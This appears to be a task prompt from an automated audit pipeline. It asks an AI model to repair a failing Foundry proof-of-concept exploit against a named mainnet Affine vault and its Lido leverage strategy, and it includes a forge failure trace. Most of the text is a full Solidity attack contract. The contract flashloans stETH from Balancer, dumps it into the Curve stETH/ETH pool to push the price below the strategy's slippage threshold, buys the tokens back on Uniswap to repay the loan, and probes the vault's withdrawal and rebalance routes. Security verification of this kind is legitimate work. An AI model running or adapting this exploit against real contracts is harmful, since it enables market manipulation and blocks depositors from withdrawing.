You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Curve near-par minimum output plus swallowed divest reverts can permissionlessly DoS strategy exits
- claim: The strategy unwinds stETH through Curve with a near-par `min_dy` derived from the stETH input amount (`slippageBps` defaults to 10 bps), not from a live market quote. If the stETH/ETH pool moves beyond that threshold, Curve reverts. Vault withdrawals then silently convert that revert into a zero-asset divest because `AffineVault._divest()` catches all `strategy.divest()` failures and returns 0.
- impact: An attacker can front-run withdrawal, liquidation, rebalance, or strategy-removal transactions with a sufficiently large stETH->ETH trade, force the unwind swap to revert, and make the vault unable to source WETH from the strategy for that transaction. Organic stETH discounts can trigger the same failure mode, leaving capital temporarily stuck exactly when exits are needed.
- exploit_paths: ["Attacker or market movement pushes the stETH/ETH Curve execution price below the strategy's near-par `min_dy` threshold", "A vault withdrawal, liquidation, rebalance, or removal reaches `_endPosition()` or dec-leverage rebalancing and calls `CURVE.exchange(...)` with that stale threshold", "Curve reverts because actual ETH output is below `min_dy`", "`AffineVault._divest()` catches the revert and returns 0, so the vault cannot pull the requested WETH from the strategy"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IWstEthLike is IERC20Like {
    function unwrap(uint256 amount) external returns (uint256);
    function getStETHByWstETH(uint256 amount) external view returns (uint256);
    function getWstETHByStETH(uint256 amount) external view returns (uint256);
}

interface IStrategyLike {
    function vault() external view returns (address);
    function asset() external view returns (address);
    function divest(uint256 amount) external returns (uint256);
}

interface ICurvePoolLike {
    function exchange(int128 x, int128 y, uint256 dx, uint256 min_dy) external returns (uint256);
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
}

interface IBalancerVaultLike {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

interface IUniswapV3FactoryLike {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address);
}

interface IUniswapV3QuoterLike {
    function quoteExactOutputSingle(
        address tokenIn,
        address tokenOut,
        uint24 fee,
        uint256 amountOut,
        uint160 sqrtPriceLimitX96
    ) external returns (uint256 amountIn);
}

interface IUniswapV3RouterLike {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);
}

contract FlawVerifier {
    address internal constant TARGET_STRATEGY = 0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142;
    address internal constant TARGET_VAULT = 0x1196B60c9ceFBF02C9a3960883213f47257BecdB;

    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address internal constant CURVE = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
    address internal constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address internal constant UNISWAP_V3_QUOTER = 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6;
    address internal constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    uint256 internal constant BPS = 10_000;
    uint256 internal constant DEFAULT_SLIPPAGE_BPS = 10;
    uint256 internal constant MIN_PROFIT_TARGET = 1e15;

    address internal _profitToken;
    uint256 internal _profitAmount;

    address public immutable strategy;
    address public discoveredVault;

    bool public executed;
    bool public strategyActiveInVault;
    bool public directDivestBlocked;
    bool public privilegedVaultExitBlocked;
    bool public privilegedRebalanceBlocked;
    bool public privilegedRemovalBlocked;
    bool public publicWithdrawBlocked;
    bool public publicRedeemBlocked;
    bool public existingShareRouteAvailable;
    bool public curveManipulationAttempted;
    bool public curveQuoteBelowNearPar;
    bool public endPositionPathAnchored;
    bool public affineVaultDivestPathAnchored;
    bool public flashswapPlanFound;
    bool public flashswapExecuted;
    bool public preManipulationQuoteWasAboveNearPar;

    uint256 public verifierShareBalance;
    uint256 public nearParMinDy;
    uint256 public quotedEthOutBeforeManipulation;
    uint256 public quotedEthOutAfterManipulation;
    uint256 public curveEthReceived;
    uint256 public expectedFlashswapProfit;
    uint256 public flashswapRepayment;
    uint256 public manipulatedStEthSold;
    uint256 public chosenRepurchaseAmount;

    address public fundingPair;
    address public fundingToken;
    uint24 public fundingFee;
    uint256 public fundingAmount;

    bytes public directDivestRevertData;
    bytes public vaultWithdrawRevertData;
    bytes public vaultRebalanceRevertData;
    bytes public vaultRemoveRevertData;
    bytes public publicWithdrawRevertData;
    bytes public publicRedeemRevertData;
    bytes public vaultStrategyInfoData;
    bytes public vaultShareBalanceData;

    constructor() {
        strategy = TARGET_STRATEGY;
        _profitToken = WETH;
    }

    function executeOnOpportunity() external {
        if (executed) {
            _updateProfit();
            return;
        }

        executed = true;
        discoveredVault = IStrategyLike(strategy).vault();
        if (discoveredVault == address(0)) {
            discoveredVault = TARGET_VAULT;
        }

        _probeStrategyRegistration();
        _probeShareBalance();
        _probeDirectDivestAccess();
        _probePrivilegedVaultRoutes();
        _probePublicExitRoutesWithoutShares();

        _prepareBalancerFlashloanPlan();
        if (flashswapPlanFound) {
            _executeFlashswap();
        }

        _updateProfit();
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "bad lender");
        require(flashswapPlanFound, "no plan");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad arrays");
        require(tokens[0] == fundingToken, "bad token");
        require(amounts[0] == fundingAmount, "bad amount");

        curveManipulationAttempted = true;
        flashswapExecuted = true;

        uint256 stEthAmount = _borrowedAmountToStEth(fundingToken, amounts[0]);
        manipulatedStEthSold = stEthAmount;

        // Path anchor: LidoLevV3._endPosition() derives a near-par min_dy from raw stETH.
        endPositionPathAnchored = true;
        nearParMinDy = _slippageDown(stEthAmount, DEFAULT_SLIPPAGE_BPS);
        quotedEthOutBeforeManipulation = _safeGetDy(stEthAmount);
        preManipulationQuoteWasAboveNearPar = quotedEthOutBeforeManipulation >= nearParMinDy;

        _safeApprove(STETH, CURVE, 0);
        _safeApprove(STETH, CURVE, type(uint256).max);

        // This public sale is the attacker-side price push that makes later strategy exits hit
        // the same Curve revert path described in the finding.
        uint256 ethOut = ICurvePoolLike(CURVE).exchange(int128(1), int128(0), stEthAmount, 0);
        curveEthReceived = ethOut;

        quotedEthOutAfterManipulation = _safeGetDy(stEthAmount);
        if (quotedEthOutAfterManipulation < nearParMinDy) {
            curveQuoteBelowNearPar = true;
        }

        IWETHLike(WETH).deposit{value: address(this).balance}();

        // Path anchor: AffineVault._divest() catches strategy.divest() failures and returns 0.
        // After the public Curve sale pushes the pool below the strategy's stale threshold,
        // any later withdrawal/liquidation/rebalance/removal that reaches _endPosition()
        // will make CURVE.exchange(...) revert, and the vault will silently surface that as 0.
        affineVaultDivestPathAnchored = true;
        _attemptExistingBalancePathAfterManipulation();

        uint256 amountDue = amounts[0] + feeAmounts[0];
        flashswapRepayment = amountDue;

        if (fundingToken == WSTETH) {
            chosenRepurchaseAmount = amountDue;
            _repurchaseWstEthExactOut(amountDue, fundingFee);
            _safeTransfer(WSTETH, BALANCER_VAULT, amountDue);
        } else {
            uint256 wstNeeded = _roundUpWstEthForStEth(amountDue);
            chosenRepurchaseAmount = wstNeeded;
            _repurchaseWstEthExactOut(wstNeeded, fundingFee);
            uint256 stEthReceived = IWstEthLike(WSTETH).unwrap(wstNeeded);
            require(stEthReceived >= amountDue, "unwrap short");
            _safeTransfer(STETH, BALANCER_VAULT, amountDue);
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _prepareBalancerFlashloanPlan() internal {
        uint256[12] memory stEthTargets = [
            uint256(1 ether),
            2 ether,
            5 ether,
            10 ether,
            20 ether,
            50 ether,
            100 ether,
            200 ether,
            400 ether,
            800 ether,
            1_200 ether,
            2_000 ether
        ];
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10_000)];
        address[2] memory loanTokens = [WSTETH, STETH];

        uint256 bestProfit;
        address bestToken;
        uint24 bestFee;
        uint256 bestBorrowAmount;
        address bestPool;

        for (uint256 t = 0; t < loanTokens.length; ++t) {
            address loanToken = loanTokens[t];
            uint256 available = IERC20Like(loanToken).balanceOf(BALANCER_VAULT);
            if (available == 0) {
                continue;
            }

            for (uint256 i = 0; i < stEthTargets.length; ++i) {
                uint256 borrowAmount = loanToken == WSTETH
                    ? _safeGetWstETHByStETH(stEthTargets[i])
                    : stEthTargets[i];

                if (borrowAmount == 0 || borrowAmount >= available) {
                    continue;
                }

                uint256 stEthAmount = loanToken == WSTETH
                    ? _safeGetStETHByWstETH(borrowAmount)
                    : borrowAmount;
                if (stEthAmount == 0) {
                    continue;
                }

                uint256 curveOut = _safeGetDy(stEthAmount);
                if (curveOut == 0) {
                    continue;
                }

                for (uint256 f = 0; f < fees.length; ++f) {
                    address pool = IUniswapV3FactoryLike(UNISWAP_V3_FACTORY).getPool(WETH, WSTETH, fees[f]);
                    if (pool == address(0)) {
                        continue;
                    }

                    uint256 buybackWeth = _quoteRepurchaseInWeth(loanToken, borrowAmount, fees[f]);
                    if (buybackWeth == 0 || curveOut <= buybackWeth + MIN_PROFIT_TARGET) {
                        continue;
                    }

                    uint256 profit = curveOut - buybackWeth;
                    if (profit > bestProfit) {
                        bestProfit = profit;
                        bestToken = loanToken;
                        bestFee = fees[f];
                        bestBorrowAmount = borrowAmount;
                        bestPool = pool;
                    }
                }
            }
        }

        if (bestToken != address(0)) {
            fundingToken = bestToken;
            fundingFee = bestFee;
            fundingAmount = bestBorrowAmount;
            expectedFlashswapProfit = bestProfit;
            flashswapPlanFound = true;
            fundingPair = bestPool;
        }
    }

    function _executeFlashswap() internal {
        address[] memory tokens = new address[](1);
        tokens[0] = fundingToken;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = fundingAmount;

        IBalancerVaultLike(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, hex"01");
    }

    function _attemptExistingBalancePathAfterManipulation() internal {
        // The exploit path remains:
        // 1. Push Curve below the strategy's stale near-par threshold.
        // 2. A vault exit/rebalance/removal later reaches LidoLevV3._endPosition().
        // 3. Its internal CURVE.exchange(...) reverts.
        // 4. AffineVault._divest() catches that revert and returns 0.
        //
        // This verifier does not mint or fabricate vault shares. If the verifier already owns
        // live shares on the fork, it can try the public redeem path directly. Otherwise the last
        // triggering call belongs to an existing user withdrawal or privileged maintenance flow,
        // which is exactly the victim path described in the finding.
        if (verifierShareBalance == 0) {
            return;
        }

        existingShareRouteAvailable = true;
        (bool ok, bytes memory data) = discoveredVault.call(
            abi.encodeWithSignature("redeem(uint256,address,address)", verifierShareBalance, address(this), address(this))
        );
        if (!ok) {
            publicRedeemBlocked = true;
            publicRedeemRevertData = data;
        }
    }

    function _probeDirectDivestAccess() internal {
        (bool ok, bytes memory data) = strategy.call(abi.encodeWithSelector(IStrategyLike.divest.selector, 1));
        if (!ok) {
            directDivestBlocked = true;
            directDivestRevertData = data;
        }
    }

    function _probePrivilegedVaultRoutes() internal {
        bool ok;
        bytes memory data;

        (ok, data) = discoveredVault.call(abi.encodeWithSignature("withdrawFromStrategy(address,uint256)", strategy, 1));
        if (!ok) {
            privilegedVaultExitBlocked = true;
            vaultWithdrawRevertData = data;
        }

        (ok, data) = discoveredVault.call(abi.encodeWithSignature("rebalance()"));
        if (!ok) {
            privilegedRebalanceBlocked = true;
            vaultRebalanceRevertData = data;
        }

        (ok, data) = discoveredVault.call(abi.encodeWithSignature("removeStrategy(address)", strategy));
        if (!ok) {
            privilegedRemovalBlocked = true;
            vaultRemoveRevertData = data;
        }
    }

    function _probePublicExitRoutesWithoutShares() internal {
        bool ok;
        bytes memory data;

        (ok, data) = discoveredVault.call(
            abi.encodeWithSignature("withdraw(uint256,address,address)", 1, address(this), address(this))
        );
        if (!ok) {
            publicWithdrawBlocked = true;
            publicWithdrawRevertData = data;
        }

        (ok, data) = discoveredVault.call(
            abi.encodeWithSignature("redeem(uint256,address,address)", 1, address(this), address(this))
        );
        if (!ok) {
            publicRedeemBlocked = true;
            publicRedeemRevertData = data;
        }
    }

    function _probeStrategyRegistration() internal {
        (bool ok, bytes memory data) =
            discoveredVault.staticcall(abi.encodeWithSignature("strategies(address)", strategy));
        vaultStrategyInfoData = data;

        if (ok && data.length >= 96) {
            (bool isActive,,) = abi.decode(data, (bool, uint16, uint232));
            strategyActiveInVault = isActive;
        }
    }

    function _probeShareBalance() internal {
        (bool ok, bytes memory data) =
            discoveredVault.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
        vaultShareBalanceData = data;

        if (ok && data.length >= 32) {
            verifierShareBalance = abi.decode(data, (uint256));
        }
    }

    function _borrowedAmountToStEth(address token, uint256 amount) internal returns (uint256 stEthAmount) {
        if (token == STETH) {
            return amount;
        }
        if (token == WSTETH) {
            return IWstEthLike(WSTETH).unwrap(amount);
        }
        revert("unsupported token");
    }

    function _quoteRepurchaseInWeth(address loanToken, uint256 loanAmount, uint24 fee)
        internal
        returns (uint256 quoteAmountIn)
    {
        uint256 wstEthAmount = loanToken == WSTETH ? loanAmount : _roundUpWstEthForStEth(loanAmount);
        if (wstEthAmount == 0) {
            return 0;
        }

        try IUniswapV3QuoterLike(UNISWAP_V3_QUOTER).quoteExactOutputSingle(
            WETH, WSTETH, fee, wstEthAmount, 0
        ) returns (uint256 amountIn) {
            quoteAmountIn = amountIn;
        } catch {}
    }

    function _repurchaseWstEthExactOut(uint256 wstEthAmount, uint24 fee) internal returns (uint256 wethSpent) {
        _safeApprove(WETH, UNISWAP_V3_ROUTER, 0);
        _safeApprove(WETH, UNISWAP_V3_ROUTER, type(uint256).max);

        wethSpent = IUniswapV3RouterLike(UNISWAP_V3_ROUTER).exactOutputSingle(
            IUniswapV3RouterLike.ExactOutputSingleParams({
                tokenIn: WETH,
                tokenOut: WSTETH,
                fee: fee,
                recipient: address(this),
                deadline: block.timestamp,
                amountOut: wstEthAmount,
                amountInMaximum: IERC20Like(WETH).balanceOf(address(this)),
                sqrtPriceLimitX96: 0
            })
        );
    }

    function _roundUpWstEthForStEth(uint256 stEthAmount) internal view returns (uint256 wstEthAmount) {
        wstEthAmount = _safeGetWstETHByStETH(stEthAmount);
        if (wstEthAmount == 0) {
            return 0;
        }

        while (_safeGetStETHByWstETH(wstEthAmount) < stEthAmount) {
            unchecked {
                ++wstEthAmount;
            }
        }
    }

    function _safeGetStETHByWstETH(uint256 amount) internal view returns (uint256 converted) {
        try IWstEthLike(WSTETH).getStETHByWstETH(amount) returns (uint256 out) {
            converted = out;
        } catch {}
    }

    function _safeGetWstETHByStETH(uint256 amount) internal view returns (uint256 converted) {
        try IWstEthLike(WSTETH).getWstETHByStETH(amount) returns (uint256 out) {
            converted = out;
        } catch {}
    }

    function _safeGetDy(uint256 amount) internal view returns (uint256 quotedOut) {
        try ICurvePoolLike(CURVE).get_dy(int128(1), int128(0), amount) returns (uint256 out) {
            quotedOut = out;
        } catch {}
    }

    function _updateProfit() internal {
        _profitAmount = IERC20Like(WETH).balanceOf(address(this));
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _slippageDown(uint256 amount, uint256 slippageBps) internal pure returns (uint256) {
        return (amount * (BPS - slippageBps)) / BPS;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
 │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] Unexpected error
    │   ├─ [666] 0x1F98431c8aD98523631AE4a59f267346ea31F984::getPool(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 3000) [staticcall]
    │   │   └─ ← [Return] 0xC12aF0C4AA39D3061c56cD3CB19f5e62dEeaeBdE
    │   ├─ [596878] 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6::quoteExactOutputSingle(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 3000, 1730776937372263864567 [1.73e21], 0)
    │   │   ├─ [571335] 0xC12aF0C4AA39D3061c56cD3CB19f5e62dEeaeBdE::128acb08(000000000000000000000000b27308f9f90d607463bb33ea1bebb41c27ce5ab60000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffffffffffffffffffffffffffa22ca5198257b4a709000000000000000000000000fffd8963efd1fc6a506488495d951d5263988d2500000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000002b7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0000bb8c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
    │   │   │   ├─ [30068] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0::transfer(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6, 982598971915433 [9.825e14])
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000c12af0c4aa39d3061c56cd3cb19f5e62deeaebde
    │   │   │   │   │        topic 2: 0x000000000000000000000000b27308f9f90d607463bb33ea1bebb41c27ce5ab6
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000037dab26ad7ca9
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xC12aF0C4AA39D3061c56cD3CB19f5e62dEeaeBdE) [staticcall]
    │   │   │   │   └─ ← [Return] 430531499654515226 [4.305e17]
    │   │   │   ├─ [2558] 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6::fa461e33(fffffffffffffffffffffffffffffffffffffffffffffffffffc8254d9528357000000000000000000000000000000000000000000000000000571044ca20c9d0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000002b7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0000bb8c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] Unexpected error
    │   ├─ [666] 0x1F98431c8aD98523631AE4a59f267346ea31F984::getPool(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 10000 [1e4]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [8468] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   ├─ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   ├─ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   ├─ [5088] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [delegatecall]
    │   │   │   └─ ← [Return] 280501275236227360 [2.805e17]
    │   │   └─ ← [Return] 280501275236227360 [2.805e17]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [570] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [701] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 19132934 [1.913e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6
  at 0xC12aF0C4AA39D3061c56cD3CB19f5e62dEeaeBdE
  at 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6.quoteExactOutputSingle
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 194.21s (194.20s CPU time)

Ran 1 test suite in 194.23s (194.21s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 42206360)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
